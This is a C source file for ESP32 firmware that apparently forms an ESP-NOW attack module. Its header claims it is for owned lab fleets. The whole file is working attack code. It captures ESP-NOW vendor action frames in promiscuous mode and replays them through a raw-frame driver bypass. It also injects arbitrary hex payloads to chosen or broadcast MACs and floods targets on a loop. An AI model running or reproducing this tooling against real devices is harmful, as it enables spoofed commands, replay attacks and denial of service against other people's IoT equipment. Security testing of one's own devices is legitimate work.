/**
 * espnow_attack.c
 *
 * Fixed-channel ESP-NOW monitor / replay / inject / flood for owned lab fleets.
 */

#include "espnow_attack.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "esp_wifi.h"
#include "esp_now.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_netif.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "wifi_controller.h"
#include "wifi_radio_claim.h"
#include "wsl_bypasser.h"
#include "heap_psram.h"

static const char *TAG = "ESPNOW_ATK";

static const uint8_t ESPRESSIF_OUI[3] = { 0x18, 0xFE, 0x34 };
static const uint8_t BROADCAST_MAC[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

static const char *mode_strings[] = {
    [ESPNOW_MODE_MONITOR] = "Monitor",
    [ESPNOW_MODE_REPLAY]  = "Replay",
    [ESPNOW_MODE_INJECT]  = "Inject",
    [ESPNOW_MODE_FLOOD]   = "Flood",
};

static espnow_attack_state_t  s_state;
static espnow_attack_config_t s_cfg;
static espnow_stored_frame_t *s_store = NULL;
static volatile bool          s_running = false;
static TaskHandle_t           s_task = NULL;
static esp_timer_handle_t     s_timeout_timer = NULL;
static SemaphoreHandle_t      s_mutex = NULL;
static bool                   s_ap_was_stopped = false;
static bool                   s_radio_claimed = false;
static bool                   s_espnow_ready = false;
static wifi_config_t          s_saved_ap;
static int64_t                s_start_us = 0;
static volatile uint16_t      s_pending_replay = 0;

const char *espnow_attack_mode_str(espnow_attack_mode_t mode)
{
    if (mode >= ESPNOW_MODE_COUNT) return "Unknown";
    return mode_strings[mode];
}

static bool mutex_take(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
        if (s_mutex == NULL) return false;
    }
    return xSemaphoreTake(s_mutex, pdMS_TO_TICKS(2000)) == pdTRUE;
}

static void mutex_give(void)
{
    if (s_mutex != NULL) {
        xSemaphoreGive(s_mutex);
    }
}

static void mac_to_str(const uint8_t *mac, char *out, size_t out_sz)
{
    snprintf(out, out_sz, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void payload_to_hex(const uint8_t *data, uint16_t len, char *out, size_t out_sz)
{
    if (!data || !out || out_sz < 3) {
        if (out && out_sz) out[0] = '\0';
        return;
    }
    size_t max_bytes = (out_sz - 1) / 2;
    if (len > max_bytes) len = (uint16_t)max_bytes;
    for (uint16_t i = 0; i < len; i++) {
        snprintf(out + i * 2, 3, "%02x", data[i]);
    }
    out[len * 2] = '\0';
}

static bool parse_hex_nibble(char c, uint8_t *out)
{
    if (c >= '0' && c <= '9') { *out = (uint8_t)(c - '0'); return true; }
    if (c >= 'a' && c <= 'f') { *out = (uint8_t)(c - 'a' + 10); return true; }
    if (c >= 'A' && c <= 'F') { *out = (uint8_t)(c - 'A' + 10); return true; }
    return false;
}

static bool ensure_store(void)
{
    if (s_store) return true;
    s_store = (espnow_stored_frame_t *)heap_psram_calloc(
        ESPNOW_ATTACK_MAX_FRAMES, sizeof(espnow_stored_frame_t));
    return s_store != NULL;
}

static bool is_espnow_vendor_action(const uint8_t *f, uint16_t len, uint8_t subtype)
{
    /* Management Action (subtype 13), Vendor Specific category + Espressif OUI */
    if (subtype != 13 || len < 32) return false;
    if (f[24] != 0x7F) return false;
    return f[25] == ESPRESSIF_OUI[0] &&
           f[26] == ESPRESSIF_OUI[1] &&
           f[27] == ESPRESSIF_OUI[2];
}

static bool extract_espnow_payload(const uint8_t *f, uint16_t len,
                                   uint8_t *payload, uint16_t *payload_len,
                                   bool *encrypted_hint)
{
    /* Vendor action: FC..Seq(24) + cat(1) + OUI(3) + type(1) + body */
    const uint16_t hdr = 29;
    if (len <= hdr) {
        *payload_len = 0;
        *encrypted_hint = false;
        return false;
    }
    uint16_t body = (uint16_t)(len - hdr);
    if (body > ESPNOW_ATTACK_PAYLOAD_MAX) {
        body = ESPNOW_ATTACK_PAYLOAD_MAX;
    }
    memcpy(payload, f + hdr, body);
    *payload_len = body;
    /* Heuristic: encrypted ESP-NOW often has type != 0x04 or opaque body */
    *encrypted_hint = (f[28] != 0x04);
    return true;
}

static void note_peer(const uint8_t *mac, int8_t rssi)
{
    if (!mac) return;
    if (memcmp(mac, BROADCAST_MAC, 6) == 0) return;

    for (uint16_t i = 0; i < s_state.peer_count; i++) {
        if (memcmp(s_state.peers[i].mac, mac, 6) == 0) {
            s_state.peers[i].rx_count++;
            s_state.peers[i].rssi = rssi;
            s_state.peers[i].channel = s_state.channel;
            s_state.peers[i].last_seen_ms =
                (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
            return;
        }
    }

    if (s_state.peer_count >= ESPNOW_ATTACK_MAX_PEERS) return;

    espnow_peer_t *p = &s_state.peers[s_state.peer_count++];
    memset(p, 0, sizeof(*p));
    memcpy(p->mac, mac, 6);
    p->rssi = rssi;
    p->channel = s_state.channel;
    p->rx_count = 1;
    p->last_seen_ms = (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
    s_state.peers_seen = s_state.peer_count;
}

static void append_log(const uint8_t *src, const uint8_t *dst,
                       const uint8_t *payload, uint16_t payload_len,
                       int8_t rssi, uint16_t frame_len,
                       bool replayed, bool injected, bool tx_ok,
                       bool encrypted_hint)
{
    if (s_state.log_count >= ESPNOW_ATTACK_MAX_LOG) return;

    espnow_log_t *e = &s_state.log[s_state.log_count++];
    memset(e, 0, sizeof(*e));
    e->time_ms = (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
    if (src) memcpy(e->src_mac, src, 6);
    if (dst) memcpy(e->dst_mac, dst, 6);
    e->rssi = rssi;
    e->len = frame_len;
    e->replayed = replayed;
    e->injected = injected;
    e->tx_ok = tx_ok;
    e->encrypted_hint = encrypted_hint;
    if (payload && payload_len) {
        e->payload_len = payload_len > ESPNOW_ATTACK_PAYLOAD_LOG_MAX
            ? ESPNOW_ATTACK_PAYLOAD_LOG_MAX : payload_len;
        memcpy(e->payload, payload, e->payload_len);
    }
}

static bool store_frame(const uint8_t *f, uint16_t len,
                        const uint8_t *src, const uint8_t *dst,
                        const uint8_t *payload, uint16_t payload_len,
                        int8_t rssi, bool encrypted_hint)
{
    if (!ensure_store() || !f || len < 24 || len > ESPNOW_ATTACK_FRAME_MAX) {
        return false;
    }

    uint32_t idx = s_state.stored_count;
    if (idx >= ESPNOW_ATTACK_MAX_FRAMES) {
        idx = idx % ESPNOW_ATTACK_MAX_FRAMES;
    } else {
        s_state.stored_count++;
    }

    espnow_stored_frame_t *slot = &s_store[idx];
    memset(slot, 0, sizeof(*slot));
    slot->len = len;
    memcpy(slot->data, f, len);
    memcpy(slot->src_mac, src, 6);
    memcpy(slot->dst_mac, dst, 6);
    slot->payload_len = payload_len > ESPNOW_ATTACK_PAYLOAD_MAX
        ? ESPNOW_ATTACK_PAYLOAD_MAX : payload_len;
    if (payload && slot->payload_len) {
        memcpy(slot->payload, payload, slot->payload_len);
    }
    slot->rssi = rssi;
    slot->encrypted_hint = encrypted_hint;
    slot->captured_ms = (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
    return true;
}

static bool tx_raw_frame(const uint8_t *frame, uint16_t len)
{
    if (!frame || len < 24) return false;
    return wsl_bypasser_send_raw_frame(frame, (int)len);
}

static void espnow_deinit_safe(void)
{
    if (!s_espnow_ready) return;
    esp_now_deinit();
    s_espnow_ready = false;
}

static esp_err_t espnow_init_safe(void)
{
    if (s_espnow_ready) return ESP_OK;
    esp_err_t err = esp_now_init();
    if (err == ESP_ERR_ESPNOW_EXIST) {
        s_espnow_ready = true;
        return ESP_OK;
    }
    if (err != ESP_OK) return err;
    s_espnow_ready = true;
    return ESP_OK;
}

static esp_err_t ensure_peer(const uint8_t *mac)
{
    if (!mac) return ESP_ERR_INVALID_ARG;
    if (esp_now_is_peer_exist(mac)) return ESP_OK;

    esp_now_peer_info_t peer;
    memset(&peer, 0, sizeof(peer));
    memcpy(peer.peer_addr, mac, 6);
    peer.channel = s_cfg.channel;
    peer.ifidx = WIFI_IF_STA;
    peer.encrypt = false;
    return esp_now_add_peer(&peer);
}

static bool inject_payload_once(void)
{
    if (s_cfg.payload_len == 0 || s_cfg.payload_len > ESPNOW_ATTACK_PAYLOAD_MAX) {
        return false;
    }

    const uint8_t *dest = s_cfg.broadcast ? BROADCAST_MAC :
                          (s_cfg.target_mac_set ? s_cfg.target_mac : BROADCAST_MAC);

    if (espnow_init_safe() != ESP_OK) {
        snprintf(s_state.error, sizeof(s_state.error), "esp_now_init failed");
        return false;
    }
    if (ensure_peer(dest) != ESP_OK) {
        snprintf(s_state.error, sizeof(s_state.error), "esp_now_add_peer failed");
        return false;
    }

    esp_err_t err = esp_now_send(dest, s_cfg.payload, s_cfg.payload_len);
    bool ok = (err == ESP_OK);
    if (ok) s_state.tx_ok++;
    else s_state.tx_fail++;

    uint8_t own[6] = {0};
    esp_wifi_get_mac(WIFI_IF_STA, own);
    append_log(own, dest, s_cfg.payload, s_cfg.payload_len,
               0, s_cfg.payload_len, false, true, ok, false);
    return ok;
}

static void replay_slot(const espnow_stored_frame_t *slot)
{
    if (!slot || slot->len < 24) return;
    bool ok = tx_raw_frame(slot->data, slot->len);
    if (ok) s_state.tx_ok++;
    else s_state.tx_fail++;
    append_log(slot->src_mac, slot->dst_mac, slot->payload, slot->payload_len,
               slot->rssi, slot->len, true, false, ok, slot->encrypted_hint);
}

static const espnow_stored_frame_t *pick_replay_slot(void)
{
    if (!s_store || s_state.stored_count == 0) return NULL;

    uint32_t count = s_state.stored_count;
    if (count > ESPNOW_ATTACK_MAX_FRAMES) count = ESPNOW_ATTACK_MAX_FRAMES;

    if (s_cfg.frame_index >= 0 && (uint32_t)s_cfg.frame_index < count) {
        return &s_store[s_cfg.frame_index];
    }
    /* Latest */
    uint32_t idx = (count - 1) % ESPNOW_ATTACK_MAX_FRAMES;
    return &s_store[idx];
}

static void IRAM_ATTR espnow_capture_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_running || !s_state.capturing) return;
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *f = pkt->payload;
    uint16_t sig_len = (uint16_t)pkt->rx_ctrl.sig_len;
    if (sig_len < 32) return;

    s_state.frames_seen++;

    uint8_t subtype = (f[0] >> 4) & 0x0F;
    if (!is_espnow_vendor_action(f, sig_len, subtype)) return;

    uint8_t dst[6], src[6];
    memcpy(dst, f + 4, 6);
    memcpy(src, f + 10, 6);

    if (s_cfg.target_mac_set) {
        if (memcmp(src, s_cfg.target_mac, 6) != 0 &&
            memcmp(dst, s_cfg.target_mac, 6) != 0) {
            return;
        }
    }

    uint8_t payload[ESPNOW_ATTACK_PAYLOAD_MAX];
    uint16_t payload_len = 0;
    bool encrypted_hint = false;
    extract_espnow_payload(f, sig_len, payload, &payload_len, &encrypted_hint);

    s_state.frames_captured++;
    s_state.rssi = pkt->rx_ctrl.rssi;

    if (!mutex_take()) return;

    note_peer(src, pkt->rx_ctrl.rssi);
    store_frame(f, sig_len, src, dst, payload, payload_len,
                pkt->rx_ctrl.rssi, encrypted_hint);
    append_log(src, dst, payload, payload_len, pkt->rx_ctrl.rssi, sig_len,
               false, false, false, encrypted_hint);

    if (s_cfg.mode == ESPNOW_MODE_REPLAY || s_cfg.mode == ESPNOW_MODE_FLOOD) {
        s_pending_replay++;
    }

    mutex_give();
}

static bool prepare_radio(void)
{
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);

    if (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
        esp_wifi_get_config(WIFI_IF_AP, &s_saved_ap);
        wifictl_mgmt_ap_stop();
        s_ap_was_stopped = true;
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(100));

    wifi_config_t empty_sta = {0};
    esp_wifi_set_config(WIFI_IF_STA, &empty_sta);
    esp_wifi_disconnect();

    uint8_t ch = s_cfg.channel;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
    s_state.channel = ch;
    return true;
}

static void restore_radio(void)
{
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    espnow_deinit_safe();
    vTaskDelay(pdMS_TO_TICKS(100));

    if (s_ap_was_stopped) {
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        esp_wifi_set_config(WIFI_IF_AP, &s_saved_ap);
        esp_wifi_start();
        wifictl_mgmt_ap_start();

        esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (ap_netif) {
            esp_netif_dhcps_stop(ap_netif);
            vTaskDelay(pdMS_TO_TICKS(50));
            esp_netif_dhcps_start(ap_netif);
        }
        s_ap_was_stopped = false;
    }

    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    if (s_radio_claimed) {
        wifi_radio_release(WIFI_RADIO_OWNER_ESPNOW);
        s_radio_claimed = false;
    }
}

static void stop_timeout_timer(void)
{
    if (s_timeout_timer != NULL) {
        esp_timer_stop(s_timeout_timer);
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
}

static void timeout_cb(void *arg)
{
    (void)arg;
    ESP_LOGW(TAG, "ESP-NOW timeout (%u s)",
             (unsigned)(s_cfg.timeout_sec ? s_cfg.timeout_sec : ESPNOW_ATTACK_TIMEOUT_SEC));
    s_state.timeout = true;
    s_running = false;
}

static void start_timeout_timer(void)
{
    stop_timeout_timer();
    uint16_t sec = s_cfg.timeout_sec ? s_cfg.timeout_sec : ESPNOW_ATTACK_TIMEOUT_SEC;
    if (sec > ESPNOW_ATTACK_TIMEOUT_MAX_SEC) sec = ESPNOW_ATTACK_TIMEOUT_MAX_SEC;
    const esp_timer_create_args_t args = {
        .callback = timeout_cb,
        .name     = "espnow_atk_to",
    };
    if (esp_timer_create(&args, &s_timeout_timer) == ESP_OK) {
        esp_timer_start_once(s_timeout_timer, (uint64_t)sec * 1000000ULL);
    }
}

static void drain_pending_replay(void)
{
    if (s_pending_replay == 0) return;
    if (!mutex_take()) return;

    uint16_t pending = s_pending_replay;
    s_pending_replay = 0;
    const espnow_stored_frame_t *slot = pick_replay_slot();
    mutex_give();

    if (!slot) return;

    s_state.transmitting = true;
    for (uint16_t i = 0; i < pending && s_running; i++) {
        if (mutex_take()) {
            slot = pick_replay_slot();
            if (slot) replay_slot(slot);
            mutex_give();
        }
        if (s_cfg.interval_ms > 0) {
            vTaskDelay(pdMS_TO_TICKS(s_cfg.interval_ms));
        }
    }
}

static void run_inject_burst(void)
{
    s_state.transmitting = true;
    uint16_t burst = s_cfg.burst_count ? s_cfg.burst_count : 1;
    if (burst > ESPNOW_ATTACK_BURST_MAX) burst = ESPNOW_ATTACK_BURST_MAX;

    for (uint16_t i = 0; i < burst && s_running; i++) {
        inject_payload_once();
        if (i + 1 < burst) {
            vTaskDelay(pdMS_TO_TICKS(s_cfg.interval_ms));
        }
    }
}

static void run_flood_loop(void)
{
    s_state.transmitting = true;
    int64_t last_tx = 0;

    while (s_running) {
        s_state.uptime_ms = (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
        int64_t now = esp_timer_get_time();

        if ((now - last_tx) >= (int64_t)s_cfg.interval_ms * 1000) {
            if (s_cfg.payload_len > 0) {
                inject_payload_once();
            } else {
                if (mutex_take()) {
                    const espnow_stored_frame_t *slot = pick_replay_slot();
                    if (slot) replay_slot(slot);
                    mutex_give();
                }
            }
            last_tx = now;
        }

        drain_pending_replay();
        vTaskDelay(pdMS_TO_TICKS(20));
    }
}

static void attack_task(void *arg)
{
    (void)arg;
    s_start_us = esp_timer_get_time();

    ESP_LOGW(TAG, "═══ ESP-NOW START ═══ ch=%u mode=%s",
             s_cfg.channel, espnow_attack_mode_str(s_cfg.mode));

    if (!prepare_radio()) {
        snprintf(s_state.error, sizeof(s_state.error), "Radio prepare failed");
        goto done;
    }

    bool need_capture =
        (s_cfg.mode == ESPNOW_MODE_MONITOR) ||
        (s_cfg.mode == ESPNOW_MODE_REPLAY) ||
        (s_cfg.mode == ESPNOW_MODE_FLOOD && s_cfg.payload_len == 0);

    if (need_capture) {
        wifi_promiscuous_filter_t filt = {
            .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
        };
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous_rx_cb(espnow_capture_cb);
        esp_wifi_set_promiscuous(true);
        s_state.capturing = true;
    }

    if (s_cfg.mode == ESPNOW_MODE_INJECT) {
        run_inject_burst();
        s_running = false;
    } else if (s_cfg.mode == ESPNOW_MODE_FLOOD) {
        run_flood_loop();
    } else if (s_cfg.mode == ESPNOW_MODE_REPLAY) {
        while (s_running) {
            s_state.uptime_ms = (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
            drain_pending_replay();

            /* Optional explicit index cycle even without new RX */
            if (s_cfg.frame_index >= 0 && s_state.stored_count > 0) {
                if (mutex_take()) {
                    const espnow_stored_frame_t *slot = pick_replay_slot();
                    if (slot) replay_slot(slot);
                    mutex_give();
                }
                vTaskDelay(pdMS_TO_TICKS(s_cfg.interval_ms));
            } else {
                vTaskDelay(pdMS_TO_TICKS(50));
            }
        }
    } else {
        /* MONITOR */
        while (s_running) {
            s_state.uptime_ms = (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }

done:
    s_state.capturing = false;
    s_state.transmitting = false;
    s_state.active = false;
    s_running = false;
    stop_timeout_timer();
    restore_radio();
    ESP_LOGW(TAG, "═══ ESP-NOW STOP ═══ cap=%lu peers=%lu tx_ok=%lu fail=%lu timeout=%d",
             (unsigned long)s_state.frames_captured,
             (unsigned long)s_state.peer_count,
             (unsigned long)s_state.tx_ok,
             (unsigned long)s_state.tx_fail,
             (int)s_state.timeout);
    s_task = NULL;
    vTaskDelete(NULL);
}

void espnow_attack_init(void)
{
    memset(&s_state, 0, sizeof(s_state));
    memset(&s_cfg, 0, sizeof(s_cfg));
    s_running = false;
    s_pending_replay = 0;
    s_cfg.frame_index = -1;
    ensure_store();
    ESP_LOGI(TAG, "ESP-NOW attack module ready");
}

esp_err_t espnow_attack_start(const espnow_attack_config_t *cfg)
{
    if (!cfg) return ESP_ERR_INVALID_ARG;
    if (s_running || s_state.active) return ESP_ERR_INVALID_STATE;
    if (cfg->channel < 1 || cfg->channel > 13) return ESP_ERR_INVALID_ARG;
    if (cfg->mode >= ESPNOW_MODE_COUNT) return ESP_ERR_INVALID_ARG;

    if ((cfg->mode == ESPNOW_MODE_INJECT ||
         (cfg->mode == ESPNOW_MODE_FLOOD && cfg->payload_len > 0)) &&
        (cfg->payload_len == 0 || cfg->payload_len > ESPNOW_ATTACK_PAYLOAD_MAX)) {
        return ESP_ERR_INVALID_ARG;
    }

    if (!ensure_store()) return ESP_ERR_NO_MEM;

    esp_err_t claim = wifi_radio_claim(WIFI_RADIO_OWNER_ESPNOW);
    if (claim != ESP_OK) return claim;
    s_radio_claimed = true;

    memset(&s_state, 0, sizeof(s_state));
    memcpy(&s_cfg, cfg, sizeof(s_cfg));

    if (s_cfg.burst_count == 0) s_cfg.burst_count = 1;
    if (s_cfg.burst_count > ESPNOW_ATTACK_BURST_MAX) {
        s_cfg.burst_count = ESPNOW_ATTACK_BURST_MAX;
    }
    if (s_cfg.interval_ms < ESPNOW_ATTACK_INTERVAL_MIN_MS) {
        s_cfg.interval_ms = ESPNOW_ATTACK_INTERVAL_MIN_MS;
    }
    if (s_cfg.timeout_sec == 0) s_cfg.timeout_sec = ESPNOW_ATTACK_TIMEOUT_SEC;
    if (s_cfg.timeout_sec > ESPNOW_ATTACK_TIMEOUT_MAX_SEC) {
        s_cfg.timeout_sec = ESPNOW_ATTACK_TIMEOUT_MAX_SEC;
    }
    if (s_cfg.broadcast) {
        memcpy(s_cfg.target_mac, BROADCAST_MAC, 6);
        s_cfg.target_mac_set = true;
    }

    s_state.active = true;
    s_state.mode = s_cfg.mode;
    s_state.channel = s_cfg.channel;
    s_state.burst_count = s_cfg.burst_count;
    s_state.interval_ms = s_cfg.interval_ms;
    strncpy(s_state.mode_str, espnow_attack_mode_str(s_cfg.mode),
            sizeof(s_state.mode_str) - 1);

    /* Keep previous store for replay-by-index; clear for fresh monitor */
    if (s_cfg.mode == ESPNOW_MODE_MONITOR || s_cfg.frame_index < 0) {
        memset(s_store, 0, sizeof(espnow_stored_frame_t) * ESPNOW_ATTACK_MAX_FRAMES);
        s_state.stored_count = 0;
    }

    s_pending_replay = 0;
    s_running = true;
    start_timeout_timer();

    if (xTaskCreate(attack_task, "espnow_atk", 6144, NULL, 2, &s_task) != pdPASS) {
        s_running = false;
        s_state.active = false;
        stop_timeout_timer();
        wifi_radio_release(WIFI_RADIO_OWNER_ESPNOW);
        s_radio_claimed = false;
        return ESP_ERR_NO_MEM;
    }

    return ESP_OK;
}

esp_err_t espnow_attack_stop(void)
{
    if (!s_running && !s_state.active) {
        restore_radio();
        return ESP_OK;
    }

    s_running = false;
    stop_timeout_timer();

    int wait = 40;
    while (s_task && wait-- > 0) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (s_state.active || s_radio_claimed || s_ap_was_stopped) {
        restore_radio();
        s_state.active = false;
        s_state.capturing = false;
        s_state.transmitting = false;
    }

    return ESP_OK;
}

bool espnow_attack_is_active(void)
{
    return s_running || s_state.active;
}

const espnow_attack_state_t *espnow_attack_get_state(void)
{
    return &s_state;
}

cJSON *espnow_attack_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    const espnow_attack_state_t *st = &s_state;
    cJSON_AddBoolToObject(root, "active", st->active || s_running);
    cJSON_AddBoolToObject(root, "capturing", st->capturing);
    cJSON_AddBoolToObject(root, "transmitting", st->transmitting);
    cJSON_AddBoolToObject(root, "timeout", st->timeout);
    cJSON_AddNumberToObject(root, "mode", st->mode);
    cJSON_AddStringToObject(root, "mode_str", st->mode_str);
    cJSON_AddNumberToObject(root, "channel", st->channel);
    cJSON_AddNumberToObject(root, "frames_seen", st->frames_seen);
    cJSON_AddNumberToObject(root, "frames_captured", st->frames_captured);
    cJSON_AddNumberToObject(root, "peers_seen", st->peers_seen);
    cJSON_AddNumberToObject(root, "peer_count", st->peer_count);
    cJSON_AddNumberToObject(root, "stored_count", st->stored_count);
    cJSON_AddNumberToObject(root, "tx_ok", st->tx_ok);
    cJSON_AddNumberToObject(root, "tx_fail", st->tx_fail);
    cJSON_AddNumberToObject(root, "uptime_ms", st->uptime_ms);
    cJSON_AddNumberToObject(root, "rssi", st->rssi);
    cJSON_AddNumberToObject(root, "burst_count", st->burst_count);
    cJSON_AddNumberToObject(root, "interval_ms", st->interval_ms);
    cJSON_AddNumberToObject(root, "log_count", st->log_count);

    if (st->error[0]) {
        cJSON_AddStringToObject(root, "error", st->error);
    }

    cJSON_AddStringToObject(root, "status",
        (st->active || s_running)
            ? (st->transmitting ? "Transmitting"
               : (st->capturing ? "Capturing" : "Preparing"))
            : (st->timeout ? "Timeout" : "Idle"));

    char buf[18];
    cJSON *peers = cJSON_CreateArray();
    for (uint16_t i = 0; i < st->peer_count; i++) {
        const espnow_peer_t *p = &st->peers[i];
        cJSON *item = cJSON_CreateObject();
        mac_to_str(p->mac, buf, sizeof(buf));
        cJSON_AddStringToObject(item, "mac", buf);
        cJSON_AddNumberToObject(item, "rssi", p->rssi);
        cJSON_AddNumberToObject(item, "channel", p->channel);
        cJSON_AddNumberToObject(item, "rx_count", p->rx_count);
        cJSON_AddNumberToObject(item, "last_seen_ms", p->last_seen_ms);
        cJSON_AddItemToArray(peers, item);
    }
    cJSON_AddItemToObject(root, "peers", peers);

    cJSON *frames = cJSON_CreateArray();
    if (s_store) {
        uint32_t count = st->stored_count;
        if (count > ESPNOW_ATTACK_MAX_FRAMES) count = ESPNOW_ATTACK_MAX_FRAMES;
        for (uint32_t i = 0; i < count; i++) {
            const espnow_stored_frame_t *f = &s_store[i];
            cJSON *item = cJSON_CreateObject();
            cJSON_AddNumberToObject(item, "index", (int)i);
            mac_to_str(f->src_mac, buf, sizeof(buf));
            cJSON_AddStringToObject(item, "src_mac", buf);
            mac_to_str(f->dst_mac, buf, sizeof(buf));
            cJSON_AddStringToObject(item, "dst_mac", buf);
            cJSON_AddNumberToObject(item, "rssi", f->rssi);
            cJSON_AddNumberToObject(item, "len", f->len);
            cJSON_AddNumberToObject(item, "payload_len", f->payload_len);
            cJSON_AddNumberToObject(item, "captured_ms", f->captured_ms);
            cJSON_AddBoolToObject(item, "encrypted_hint", f->encrypted_hint);
            char hex[ESPNOW_ATTACK_PAYLOAD_LOG_MAX * 2 + 1];
            uint16_t show = f->payload_len > ESPNOW_ATTACK_PAYLOAD_LOG_MAX
                ? ESPNOW_ATTACK_PAYLOAD_LOG_MAX : f->payload_len;
            payload_to_hex(f->payload, show, hex, sizeof(hex));
            cJSON_AddStringToObject(item, "payload", hex);
            cJSON_AddItemToArray(frames, item);
        }
    }
    cJSON_AddItemToObject(root, "frames", frames);

    cJSON *logs = cJSON_CreateArray();
    for (uint16_t i = 0; i < st->log_count; i++) {
        const espnow_log_t *e = &st->log[i];
        cJSON *item = cJSON_CreateObject();
        cJSON_AddNumberToObject(item, "time_ms", e->time_ms);
        mac_to_str(e->src_mac, buf, sizeof(buf));
        cJSON_AddStringToObject(item, "src_mac", buf);
        mac_to_str(e->dst_mac, buf, sizeof(buf));
        cJSON_AddStringToObject(item, "dst_mac", buf);
        cJSON_AddNumberToObject(item, "rssi", e->rssi);
        cJSON_AddNumberToObject(item, "len", e->len);
        cJSON_AddBoolToObject(item, "replayed", e->replayed);
        cJSON_AddBoolToObject(item, "injected", e->injected);
        cJSON_AddBoolToObject(item, "tx_ok", e->tx_ok);
        cJSON_AddBoolToObject(item, "encrypted_hint", e->encrypted_hint);
        char hex[ESPNOW_ATTACK_PAYLOAD_LOG_MAX * 2 + 1];
        payload_to_hex(e->payload, e->payload_len, hex, sizeof(hex));
        cJSON_AddStringToObject(item, "payload", hex);
        cJSON_AddNumberToObject(item, "payload_len", e->payload_len);
        cJSON_AddItemToArray(logs, item);
    }
    cJSON_AddItemToObject(root, "logs", logs);

    return root;
}

bool espnow_attack_parse_hex_payload(const char *hex, uint8_t *out, uint16_t *out_len)
{
    if (!hex || !out || !out_len) return false;
    size_t n = strlen(hex);
    if (n == 0 || (n % 2) != 0) return false;
    size_t bytes = n / 2;
    if (bytes > ESPNOW_ATTACK_PAYLOAD_MAX) return false;
    for (size_t i = 0; i < bytes; i++) {
        uint8_t hi, lo;
        if (!parse_hex_nibble(hex[i * 2], &hi) ||
            !parse_hex_nibble(hex[i * 2 + 1], &lo)) {
            return false;
        }
        out[i] = (uint8_t)((hi << 4) | lo);
    }
    *out_len = (uint16_t)bytes;
    return true;
}
